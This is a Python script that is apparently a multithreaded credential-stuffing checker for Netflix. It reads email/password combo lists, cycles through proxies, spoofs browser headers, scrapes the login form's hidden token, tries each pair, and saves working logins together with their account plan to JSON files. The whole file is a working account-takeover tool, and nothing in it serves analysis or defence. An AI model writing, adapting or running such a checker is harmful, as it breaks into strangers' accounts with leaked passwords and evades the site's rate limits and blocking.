import json
from threading import Thread, Lock
import urllib,re
from bs4 import BeautifulSoup
from httplib2 import ProxyInfo, Http

from emailpassword import email_password
from proxydictionary2 import htttp_proxy, socks4_proxy, socks5_proxy

start_count = 0
ip_count = 0
proxy_list = []
combos = []
verified = []
lock = Lock()


def select_proxy():
    global ip_count
    with lock:
        if ip_count == len(proxy_list):
            print(ip_count)
            ip_count = 0
        ip = ip_count
        ip_count += 1
    return ip


def inc_count(proxy_num):
    proxy_list[proxy_num]["count"] += 1


class CreateTask(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        while True:
            proxy_num = select_proxy()
            proxy = proxy_list[proxy_num]
            try:
                temp = 0
                global start_count
                if start_count >= len(combos):
                    break
                http = Http(
                    proxy_info=ProxyInfo(proxy_host=str(proxy["proxy"]), proxy_port=int(proxy["port"]),
                                         proxy_type=proxy["type"], proxy_user=proxy["user"], proxy_pass=proxy["pass"]))
                # http=Http()
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
                    "Origin": "https://www.netflix.com",
                    "Referer": "https://www.netflix.com/login"
                }

                res, cont = http.request("https://www.netflix.com/login", method="GET", headers=headers)
                if res["status"] == '200':
                    with lock:
                        k = start_count
                        start_count += 1
                        print(start_count)
                    combo = combos[k]
                    cookies = res["set-cookie"].replace(" ", "")
                    cookies = cookies.split(",")
                    cookies2 = []
                    for cookie in cookies:
                        if ";" in cookie and ":" not in cookie:
                            cookies2.append(cookie.split(";")[0])

                    cook = ""
                    for i in cookies2:
                        cook += "; " + i
                    cook = cook[2:]
                    headers["Cookie"] = cook
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    cont = BeautifulSoup(cont, 'html.parser')
                    fn = cont.find_all(type="hidden")

                    body = {"userLoginId": combo["email"], "password": combo["password"], "rememberMe": "true",
                            "flow": "websiteSignUp", "mode": "login", "action": "loginAction",
                            "withFields": "userLoginId,password,rememberMe,nextPage", "authURL": fn[4]["value"],
                            "nextPage": "", "showPassword": ""}

                    body = urllib.parse.urlencode(body)
                    res, cont = http.request("https://www.netflix.com/login", method="POST", body=body, headers=headers)
                    cont = cont.decode(encoding="UTF-8")
                    if not cont:
                        headers = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
                        }
                        cookies = res["set-cookie"].replace(" ", "")
                        cookies = cookies.split(",")
                        cookies2 = []
                        for cookie in cookies:
                            if ";" in cookie and ":" not in cookie:
                                cookies2.append(cookie.split(";")[0])

                        cook = ""
                        for i in cookies2:
                            cook += "; " + i
                        cook = cook[2:]
                        headers["Cookie"] = cook
                        res, cont = http.request("https://www.netflix.com/youraccount", method="GET", headers=headers)
                        cont = cont.decode(encoding="UTF-8")
                        match = re.search("<div class=\"account-section-item\">\<b\>(.*?)\<\/b\>", cont)
                        if match:
                            with open("netflix/"+str(k) + str(match.group(1))+".json", "w") as a:
                                json.dump(combo, a)
                            print(combo, match.group(1))
                    del http
            except Exception as a:
                inc_count(proxy_num)
                continue
            if temp == 1:
                break


# proxy_list = proxy_list + socks5_proxy() + socks4_proxy() +
proxy_list = htttp_proxy()
combos = email_password()
# print(proxy_list[0])
# print(combos[0])

for i in range(0, 200):
    thread = CreateTask()
    thread.start()
